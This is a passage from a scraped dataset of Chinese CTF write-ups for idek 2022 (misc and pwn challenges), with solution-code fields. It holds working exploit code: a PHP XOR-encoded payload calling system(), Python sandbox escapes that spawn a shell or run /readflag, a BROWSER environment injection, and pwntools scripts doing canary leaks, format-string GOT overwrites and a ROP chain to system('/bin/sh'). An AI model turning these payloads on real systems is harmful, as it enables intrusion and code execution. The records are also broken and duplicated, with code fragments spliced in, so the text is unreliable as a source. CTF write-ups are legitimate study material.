...: ,'levenshtein','localeconv','ltrim','md5_​file','md5','metaphone','money_​format','nl_​langinfo','nl2br','nure\n     ...: _​format','ord','parse_​str','print','printf','quoted_​printable_​decode','quoted_​printable_​encode','quote',\n     ...: rtrim','setlocale','sha1_​file','sha1','similar_​text','soundex','sprintf','sscanf','str_​contains','str_​eniw\n     ...: th','str_​getcsv','str_​ireplace','str_​pad','str_​repeat','str_​replace','str_​rot13','str_​shuffle','str_​s'\n     ...: tr_​starts_​with','str_​word_​count','strcasecmp','strchr','strcmp','strcoll','strcspn','strip_​tags','striphs\n     ...: es','stripos','stripslashes','stristr','strlen','strnatcasecmp','strnatcmp','strncasecmp','strncmp','strpbrk'\n     ...: ,'strpos','strrchr','strrev','strripos','strrpos','strspn','strstr','strtok','strtolower','strtoupper','strtr\n     ...: ','substr_​compare','substr_​count','substr_​replace','substr','trim','ucfirst','ucwords','utf8_​decode','utne\n     ...: code','vfprintf','vprintf','vsprintf','wordwrap']\n\nIn [210]: for func in str_funcs:\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\nstrstr\nstrtr\n```\n\n然后通过 `strstr` 就可以拿到 `false = strstr('.',',')`，但是还不够，于是就跑去把所有的函数都拿来了（https://www.php.net/manual/zh/indexes.functions.php）：\n\n```\nIn [211]: phpfuncs = []\n     ...: with open(\"/phpfuncs.txt\",'r', encoding='utf8') as f:\n     ...:     phpfuncs = f.read().split(',')\n     ...:\n\nIn [212]: for func in phpfuncs:\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\nsqrt\nstrstr\nstrtr\n```\n\n然后通过 `sqrt(strstr('.',','))` 拿到了 `0` ，但是拿到数字之后现在并没有什么用，于是想办法放到之前已经有的字符里面看看还能生成什么字符：\n\n```\nIn [215]: mapping = {}\n     ...: for a, b in combinations('[(,.^)]0', 2):\n     ...:     x = chr(ord(a) ^ ord(b))\n     ...:     if x in mapping:\n     ...:         continue\n     ...:     mapping[x] = (a, b)\n     ...: mapping\nOut[215]:\n{'s': ('[', '('),\n 'w': ('[', ','),\n 'u': ('[', '.'),\n '\\x05': ('[', '^'),\n 'r': ('[', ')'),\n '\\x06': ('[', ']'),\n 'k': ('[', '0'),\n '\\x04': ('(', ','),\n 'v': ('(', '^'),\n '\\x01': ('(', ')'),\n '\\x18': ('(', '0'),\n '\\x02': (',', '.'),\n 'q': (',', ']'),\n '\\x1c': (',', '0'),\n 'p': ('.', '^'),\n '\\x07': ('.', ')'),\n '\\x1e': ('.', '0'),\n '\\x03': ('^', ']'),\n 'n': ('^', '0'),\n 't': (')', ']'),\n '\\x19': (')', '0'),\n 'm': (']', '0')}\n In [216]: for func in phpfuncs:\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\nsqrt\nstrspn\nstrstr\nstrtr\n```\n\n多了一个 `strspn` 那么现在就有任意数字了，接下来就想办法构造 `chr` 函数：\n\n```\n'c': ('[', '8')\n'h': ('[', '3')\n'r': ('[', ')')\n```\n\n`chr` 出了就可以开始写 exp 了：\n\n```python\nfrom pwn import *\n\ns      = \"('['^'(')\"\nstr    = f\"{s}.(')'^']').('['^')')\"\nstrstr = f\"{str}.{str}\"\nsqrt   = f\"{s}.(','^']').('['^')').(')'^']')\"\nzero   = f\"({sqrt})(({strstr})('.',',')).''\"\nstrspn = f\"{str}.{s}.('.'^'^').('^'^{zero})\"\nnum    = lambda x:f\"({strspn})('{'.' * x}','.')\"\nphpchr = lambda x:f\"(('['^{num(8)}.'').('['^{num(3)}.'').('['^')'))({num(ord(x))})\"\nphpstr = lambda str:'.'.join([phpchr(c) for c in str])\n\npayload = f\"({phpstr('system')})({phpstr('cat /flag.txt')})\"\nprint(payload)\n\nr = remote('phpfun.chal.idek.team', 1337)\nr.recvuntil(b'Input script: ')\nr.sendline(payload.encode())\nr.interactive()\n```\n\n### Manager Of The Year I:\n\n此题和AI毫无关系，训练数据和x全都是多余的\n如果第一个数是y，可以第一次全猜0，第二次第一个数是1，其他是0，这样就从MSE可以得到y^2-(y-1)^2=2y-1，从而可以知道y。猜366次就能知道每个数\n\n```python\nfrom pwn import *\nimport re\nconn=remote(\"manager-of-the-year-1.chal.idek.team\",1337)\nconn.sendline()\nconn.recvuntil(\") for 2023:\")\nconn.sendline(\" \".join([\"0\"]*365))\nu=con", "solution_code": "from pwn import *\n\ns      = \"('['^'(')\"\nstr    = f\"{s}.(')'^']').('['^')')\"\nstrstr = f\"{str}.{str}\"\nsqrt   = f\"{s}.(','^']').('['^')').(')'^']')\"\nzero   = f\"({sqrt})(({strstr})('.',',')).''\"\nstrspn = f\"{str}.{s}.('.'^'^').('^'^{zero})\"\nnum    = lambda x:f\"({strspn})('{'.' * x}','.')\"\nphpchr = lambda x:f\"(('['^{num(8)}.'').('['^{num(3)}.'').('['^')'))({num(ord(x))})\"\nphpstr = lambda str:'.'.join([phpchr(c) for c in str])\n\npayload = f\"({phpstr('system')})({phpstr('cat /flag.txt')})\"\nprint(payload)\n\nr = remote('phpfun.chal.idek.team', 1337)\nr.recvuntil(b'Input script: ')\nr.sendline(payload.encode())\nr.interactive()\n\nfrom pwn import *\nimport re\nconn=remote(\"manager-of-the-year-1.chal.idek.team\",1337)\nconn.sendline()\nconn.recvuntil(\") for 2023:\")\nconn.sendline(\" \".join([\"0\"]*365))\nu=conn.recvuntil(\") for 2023:\")\nu=(float(re.findall(b\"\\((.*?)\\)\",u)[0])**2)*365\nz=[]\nfor i in range(365):\n    print(i)\n    conn.sendline(\" \".join([\"1\" if j==i else \"0\" for j in range(365)]))\n    v=conn.recvuntil(\") for 2023:\")\n    v=(float(re.findall(b\"\\((.*?)\\)\",v)[0])**2)*365\n    z.append((u-v+1)/2)\nconn.sendline(\" \".join([str(i) for i in z]))\nconn.interactive()\n\nfrom pwn import *\nimport re\nconn=remote(\"manager-of-the-year-2.chal.idek.team\",1337)\nconn.sendline()\nprint(conn.recvuntil(\") for 2023:\"))\ndef guess(v):\n    conn.sendline(\" \".join([str(i) for i in v]))\n    u=conn.recvuntil(\") for 2023:\", timeout=1)\n    return b'neural' in u\n\nimport math\ngr=(math.sqrt(5)-1)/2\nv=[100*gr*gr]*365\nguess(v)\nfor i in range(365):\n    l=0\n    ll=100*gr*gr\n    rr=100*gr\n    r=100\n    guesscnt=0\n    while (guesscnt<18) or (guesscnt==18 and rr-ll>0.1187):\n        oldv=v[:]\n        v[i]=rr\n        guesscnt=guesscnt+1\n        if guess(v):\n            guesscnt=guesscnt+1\n            v=oldv[:]\n            t=guess(v)\n            r=rr\n            rr=ll\n            ll=gr*l+gr*gr*r\n            l,ll,rr,r=r,rr,ll,l\n        else:\n            l=ll\n            ll=rr\n            rr=gr*r+gr*gr*l\n    print(i)\n\nconn.sendline(\" \".join([str(i) for i in v]))\nconn.interactive()\n\n__import__(\"os\").system(\"sh\")\n\neval(input())\n\nblocklist = ['.', '\\\\', '[', ']', '{', '}',':']\nDISABLE_FUNCTIONS = [\"getattr\", \"eval\", \"exec\", \"breakpoint\", \"lambda\", \"help\"]\nDISABLE_FUNCTIONS = {func: None for func in DISABLE_FUNCTIONS}\n\n(setattr(__import__(\"sys\"), \"path\", list((\"/dev/shm/\",))), print(\"import os\" + chr(10) + \"print(os\" + chr(46) + \"system('/readflag giveflag'))\", file=open(\"/dev/shm/exp\" + chr(46) + \"py\", \"w\")), __import__(\"exp\"))\n\nimport webbrowser\nimport hashlib\n\nwebbrowser.open(\"https://xkcd.com/353/\")\n\ndef geohash(latitude, longitude, datedow):\n    '''Compute geohash() using the Munroe algorithm.\n    >>> geohash(37.421542, -122.085589, b'2005-05-26-10458.68')\n    37.857713 -122.544543\n    '''\n    # https://xkcd.com/426/\n    h = hashlib.md5(datedow, usedforsecurity=False).hexdigest()\n    p, q = [('%f' % float.fromhex('0.' + x)) for x in (h[:16], h[16:32])]\n    print('%d%s %d%s' % (latitude, p[1:], longitude, q[1:]))\n\ndef open(url, new=0, autoraise=True):\n    \"\"\"Display url using the default browser.\n    If possible, open url in a location determined by new.\n    - 0: the same browser window (the default).\n    - 1: a new browser window.\n    - 2: a new browser page (\"tab\").\n    If possible, autoraise raises the window (the default) or not.\n    \"\"\"\n    if _tryorder is None:\n        with _lock:\n            if _tryorder is None:\n                register_standard_browsers()\n    for name in _tryorder:\n        browser = get(name)\n        if browser.open(url, new, autoraise):\n            return True\n    return False\n\n    if \"BROWSER\" in os.environ:\n        userchoices = os.environ[\"BROWSER\"].split(os.pathsep)\n        userchoices.reverse()\n\n        # Treat choices in same way as if passed into get() but do register\n        # and prepend to _tryorder\n        for cmdline in userchoices:\n            if cmdline != '':\n                cmd = _synthesize(cmdline, preferred=True)\n                if cmd[1] is None:\n                    register(cmdline, None, GenericBrowser(cmdline), preferred=True)\n\nclass GenericBrowser(BaseBrowser):\n    \"\"\"Class for all browsers started with a command\n       and without remote functionality.\"\"\"\n\n    def __init__(self, name):\n        if isinstance(name, str):\n            self.name = name\n            self.args = [\"%s\"]\n        else:\n            # name should be a list with arguments\n            self.name = name[0]\n            self.args = name[1:]\n        self.basename = os.path.basename(self.name)\n\n    def open(self, url, new=0, autoraise=True):\n        sys.audit(\"webbrowser.open\", url)\n        cmdline = [self.name] + [arg.replace(\"%s\", url)\n                                 for arg in self.args]\n        try:\n            if sys.platform[:3] == 'win':\n                p = subprocess.Popen(cmdline)\n            else:\n                p = subprocess.Popen(cmdline, close_fds=True)\n            return not p.wait()\n        except OSError:\n            return False\n\n__import__('antigravity',setattr(__import__('os'),'environ',dict(BROWSER='/bin/sh -c \"/readflag giveflag\" #%s')))\n\nsetattr(__import__('sys'),'modules',__builtins__) or __import__('getattr')(__import__('os'),'system')('sh')\n\n     ...: code','count_​chars','crc32','crypt','echo','explode','fprintf','get_​html_​translation_​table','hebrev','heni\n     ...: ','html_​entity_​decode','htmlentities','htmlspecialchars_​decode','htmlspecialchars','implode','join','lcfi't\n     ...: ,'levenshtein','localeconv','ltrim','md5_​file','md5','metaphone','money_​format','nl_​langinfo','nl2br','nure\n     ...: _​format','ord','parse_​str','print','printf','quoted_​printable_​decode','quoted_​printable_​encode','quote',\n     ...: rtrim','setlocale','sha1_​file','sha1','similar_​text','soundex','sprintf','sscanf','str_​contains','str_​eniw\n     ...: th','str_​getcsv','str_​ireplace','str_​pad','str_​repeat','str_​replace','str_​rot13','str_​shuffle','str_​s'\n     ...: tr_​starts_​with','str_​word_​count','strcasecmp','strchr','strcmp','strcoll','strcspn','strip_​tags','striphs\n     ...: es','stripos','stripslashes','stristr','strlen','strnatcasecmp','strnatcmp','strncasecmp','strncmp','strpbrk'\n     ...: ,'strpos','strrchr','strrev','strripos','strrpos','strspn','strstr','strtok','strtolower','strtoupper','strtr\n     ...: ','substr_​compare','substr_​count','substr_​replace','substr','trim','ucfirst','ucwords','utf8_​decode','utne\n     ...: code','vfprintf','vprintf','vsprintf','wordwrap']\n\n\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\n\n\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\n\n\n     ...:     if all(c in mapping for c in func):\n     ...:         print(func)\n     ...:\n\n\n    print(i)\n    conn.sendline(\" \".join([\"1\" if j==i else \"0\" for j in range(365)]))\n    v=conn.recvuntil(\") for 2023:\")\n    v=(float(re.findall(b\"\\((.*?)\\)\",v)[0])**2)*365\n    z.append((u-v+1)/2)\n\n\n    l=0\n    ll=100*gr*gr\n    rr=100*gr\n    r=100\n    guesscnt=0\n    while (guesscnt<18) or (guesscnt==18 and rr-ll>0.1187):\n        oldv=v[:]\n        v[i]=rr\n        guesscnt=guesscnt+1\n        if guess(v):\n            guesscnt=guesscnt+1\n            v=oldv[:]\n            t=guess(v)\n            r=rr\n            rr=ll\n            ll=gr*l+gr*gr*r\n            l,ll,rr,r=r,rr,ll,l\n        else:\n            l=ll\n            ll=rr\n            rr=gr*r+gr*gr*l\n    print(i)\n\n\n    '''Compute geohash() using the Munroe algorithm.\n    >>> geohash(37.421542, -122.085589, b'2005-05-26-10458.68')\n    37.857713 -122.544543\n    '''\n    # https://xkcd.com/426/\n    h = hashlib.md5(datedow, usedforsecurity=False).hexdigest()\n    p, q = [('%f' % float.fromhex('0.' + x)) for x in (h[:16], h[16:32])]\n    print('%d%s %d%s' % (latitude, p[1:], longitude, q[1:]))\n\n\n    def __init__(self, name):\n        if isinstance(name, str):\n            self.name = name\n            self.args = [\"%s\"]\n        else:\n            # name should be a list with arguments\n            self.name = name[0]\n            self.args = name[1:]\n        self.basename = os.path.basename(self.name)\n\n\n    def open(self, url, new=0, autoraise=True):\n        sys.audit(\"webbrowser.open\", url)\n        cmdline = [self.name] + [arg.replace(\"%s\", url)\n                                 for arg in self.args]\n        try:\n            if sys.platform[:3] == 'win':\n                p = subprocess.Popen(cmdline)\n            else:\n                p = subprocess.Popen(cmdline, close_fds=True)\n            return not p.wait()\n        except OSError:\n            return False\n", "tools": ["python", "john"], "file_path": "temp_repos\\r3kapig_writeup\\20230119-idek2022-Misc_OSINT_BlockChain\\README.md", "file_size": 39906, "scraped_at": "2025-10-26T18:19:26.845783"}
{"id": "r3kapig_writeup_idek_2022*_Pwn_&&_Reverse_Writeup", "team": "r3kapig", "repo": "writeup", "challenge_name": "idek 2022* Pwn && Reverse Writeup", "attack_type": "AES", "writeup": "# idek 2022* Pwn && Reverse Writeup\n\n## 前言:\n\nidek* 2022有一些有趣的pwn和reverse题目.pwn差了一个题目AK,reverse差得比较多.之后有时间再进行相关的总结.另外有兴趣打国际赛的小伙伴.欢迎简历`root@r3kapig.com`,欢迎更多reverse,pwn,crypto,web的小伙伴.\n\n![](https://i.imgur.com/nvVnauC.png)\n\n## Pwn:\n\n### Typop:\n\n一道栈溢出pwn题，存在一个后门函数vuln，但是需要控制a1,a2,a3三个参数，泄露canary和pie以及栈地址后，通过修改rbp来跳转到后门函数，通过栈地址控制filename为flag\n\n![](https://i.imgur.com/unadfwC.png)\n\nexp:\n\n```python\n from pwn import *\n\np = process('./chall')\n#p=remote('typop.chal.idek.team',1337)\n# libc=ELF('./libc.so.6')\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nr = lambda x: p.recv(x)\nra = lambda: p.recvall()\nrl = lambda: p.recvline(keepends=True)\nru = lambda x: p.recvuntil(x, drop=True)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nia = lambda: p.interactive()\nc = lambda: p.close()\nli = lambda x: log.info(x)\ndb = lambda: gdb.attach(p)\ngdb.attach(p,'b* $rebase(0x138E)')\nsla('Do you want to complete a survey?','y')\n\nsa('Do you like ctf?','a'*11)\nru('a'*10)\ncanary=u64(p.recv(8).ljust(8,'\\x00'))-0x61\ninfo('canary->'+hex(canary))\nstackaddr=u64(p.recv(6).ljust(8,'\\x00'))\nsa('Can you provide some extra feedback?','a'*10+p64(canary))\ninfo('stack->'+hex(stackaddr))\nsla('Do you want to complete a survey?','y')\nsa('Do you like ctf?','a'*0x1a)\nru('a'*0x1a)\ntextaddr=u64(p.recv(6).ljust(8,'\\x00'))-0x1447\ninfo('text->'+hex(textaddr))\ntarget=0x1273+textaddr\nsa('Can you provide some extra feedback?','a'*10+p64(canary)+p64(stackaddr+0x6c)+p64(target)+'a\\x00\\x00\\x00'+'l\\x00\\x00\\x00'+'f\\x00\\x00\\x00')\np.interactive()\n```\n\n### Sprinter:\n\n由于Sprintf的format和dest参数相同，因此存在边解析边copy的情况，因此我们可以用%s+\\x00来绕过strchr对于n字符的过滤，通过\\x00来绕过strchr的检测，然后通过%s来覆写掉我们的\\x00。这样我们就可以使用%n。然后改返回地址为vuln函数中的0x401209（这里我没注意，返回的是一个非程序本身的gadget，不过还是能执行，返回0x40120e应该也行），同时更改掉strchr的got表。\n由于fgets有0x100的长度，我有几个思路：\n\n1. 更改stack_chk_fail函数的got表为ret，然后利用字符串末尾的%s实现栈溢出，不过由于我们实现ROP途中很多地址带0，%s不太好造成能够覆盖一条ROP链的溢出。\n2. 更改strchr got表为printf，重回vuln函数之后可以造成裸的printf的格式化字符串漏洞。这里由于printf_plt末尾为\\xd0，我们一共只有0x100的长度，不够用。因此也放弃。\n3. 更改strchr got表为pop1_ret的gadget，然后可执行ROP链，这里仍需注意：我最开始更改的是pop6_ret的gadget，这会导致重回vuln函数失败。然后就是普通的泄露libc基址后调用system+/bin/sh提权。（由于栈错位，这里fgets读取的输入会覆盖掉fgets的返回地址，因此不用再触发strchr即可控制程序执行流）。\n\nexp:\n\n```py\nfrom pwn import *\ncontext.terminal = ['gnome-terminal', '-x', 'sh', '-c']\ncontext.log_level = 'debug'\n\ndef qwq(name):\n  log.success(hex(name))\n\ndef debug(point):\n  gdb.attach(r,'b '+str(point))\n\nr = process('/mnt/hgfs/ubuntu/idek/sprinter/vuln')\n# r = remote('sprinter.chal.idek.team',1337)\nelf =ELF('/mnt/hgfs/ubuntu/idek/sprinter/vuln')\nlibc = ELF('/mnt/hgfs/ubuntu/idek/sprinter/libc-2.31.so')\n\nr.recvuntil(b\"Enter your string into my buffer, located at \")\nstack_addr = int(r.recvuntil(b':')[:-1],16)\ntarget_addr = stack_addr-8\n\ndebug(\"sprintf\")\n# debug(\" *0x401245\")\n# gdb.attach(r)\n\n\n# payload = b'%sa\\x00%'+b'b'*0x3+b'c%9$hhn'+b'bbbbbbb'+b'%33$hhn'\npayload = b'%sa\\x00%'+b'b'*0x3+b'c%31$hhn'+b'%bbbbbbbbc'+b'%33$hhn'+b'%'+b'b'*(0x30-5)+b'c%34$n'+b'%'+b'b'*(0x26+0xc-2)+b'c%32$hhn'\npayload=payload.ljust(0xd0,b'\\x00')\npayload=payload+p64(target_addr)+p64(elf.got[\"strchr\"])+p64(elf.got[\"strchr\"]+1)+p64(elf.got[\"strchr\"]+2)\n#printf_plt = 0x4010d0\n#pop5_ret = 0x401366\n\nr.sendline(payload)\n# r.recvuntil(b'(')\npause()\npop_rdi = 0x0000000000401373\nleak_payload = p64(pop_rdi)+p64(elf.got[\"fgets\"])+p64(elf.plt[\"printf\"])+p64(0x40122F)\nr.sendline(leak_payload)\nlibc_base = u64(r.recvuntil(b'\\x7f')[-6:].ljust(0x8,b'\\0'))-libc.sym[\"fgets\"]\nsystem_addr = libc_base+libc.sym[\"system\"]\npause()\nr.sendline(b'/bin/sh\\x00'+b'a'*0x10+p64(pop_rdi+1)+p64(pop_rdi)+p64(stack_addr)+p64(system_addr))\n\nqwq(stack_addr)\nqwq(libc_base)\nr.interactive()\n```\n\n### Coroutine:\n\n考的 C++20 协程，可以参考这个来理解流程\n\n1. C++20协程原理和应用(https://zhuanlan.zhihu.com/p/497224333)\n2. C++ 协程——实战演示 - Incredibuild(https://www.incredibuild.cn/blog/cppxiechengshizhanyanshi)\n保护全开，代码中有将 flag 加载进栈上的操作。初步怀疑是竞争问题或者逻辑漏洞，肯定不是内存安全。\n\n大概推测可能跟协程引用了被换掉的 buffer 地址有关。\n\n漏洞点是这里（里面的 printf 都是我自己加的）：\n\n```cpp\nTask<bool> SendAllAsyncNewline(io_context& ctx, int socket, std::span<std::byte> buffer)\n{\n    std::byte buffer2[513];\n    // buffer 堆地址\n    printf(\"SendAllAsyncNewline buffer: %p\\n\", buffer.data());\n    // buffer2 栈地址，这块地址会跟存放 flag 的栈地址重叠\n    printf(\"SendAllAsyncNewline buffer2: %p\\n\", buffer2);\n    std::copy(buffer.begin(), buffer.end(), buffer2);\n    buffer2[buffer.size()] = (std::byte)'\\n';\n    \n    return SendAllAsync(ctx, socket, std::span(buffer2, buffer.size()+1));\n}\n\nTask<bool> SendAllAsync(io_context& ctx, int socket, std::span<std::byte> buffer)\n{    \n    // 这里的 buffer 是栈地址\n    printf(\"SendAllAsync origin buffer: %p\\n\", buffer.data());\n    int offset = 0;\n    // 如果没有完全写入，则会重新写\n    while (offset < buffer.size())\n    {\n        printf(\"SendAllAsync before SendAsync buffer: %p\\n\", buffer.data() + offset);\n        int result = co_await SendAsync(ctx, socket, std::span(buffer.data() + offset, buffer.size() - offset));\n        printf(\"SendAsync result: %d(%x)\", result, result);\n        if (result == -1)\n    ", "solution_code": " from pwn import *\n\np = process('./chall')\n#p=remote('typop.chal.idek.team',1337)\n# libc=ELF('./libc.so.6')\n#context.log_level = 'debug'\ncontext.arch = 'amd64'\nr = lambda x: p.recv(x)\nra = lambda: p.recvall()\nrl = lambda: p.recvline(keepends=True)\nru = lambda x: p.recvuntil(x, drop=True)\nsl = lambda x: p.sendline(x)\nsa = lambda x, y: p.sendafter(x, y)\nsla = lambda x, y: p.sendlineafter(x, y)\nia = lambda: p.interactive()\nc = lambda: p.close()\nli = lambda x: log.info(x)\ndb = lambda: gdb.attach(p)\ngdb.attach(p,'b* $rebase(0x138E)')\nsla('Do you want to complete a survey?','y')\n\nsa('Do you like ctf?','a'*11)\nru('a'*10)\ncanary=u64(p.recv(8).ljust(8,'\\x00'))-0x61\ninfo('canary->'+hex(canary))\nstackaddr=u64(p.recv(6).ljust(8,'\\x00'))\nsa('Can you provide some extra feedback?','a'*10+p64(canary))\ninfo('stack->'+hex(stackaddr))\nsla('Do you want to complete a survey?','y')\nsa('Do you like ctf?','a'*0x1a)\nru('a'*0x1a)\ntextaddr=u64(p.recv(6).ljust(8,'\\x00'))-0x1447\ninfo('text->'+hex(textaddr))\ntarget=0x1273+textaddr\nsa('Can you provide some extra feedback?','a'*10+p64(canary)+p64(stackaddr+0x6c)+p64(target)+'a\\x00\\x00\\x00'+'l\\x00\\x00\\x00'+'f\\x00\\x00\\x00')\np.interactive()\n\n➜  attachments nc coroutine.chal.idek.team 1337\n== proof-of-work: disabled ==\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 2\nBuffer size> 1\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 1\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\nData> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\nData> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\nData> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\nData> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nData> Select Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaData> \nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 4\nData> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSelect Option:\n1. Connect\n2. Change Receive Buffer\n3. Change Send Buffer\n4. Send data\n5. Receive data\n> 5\nSize> 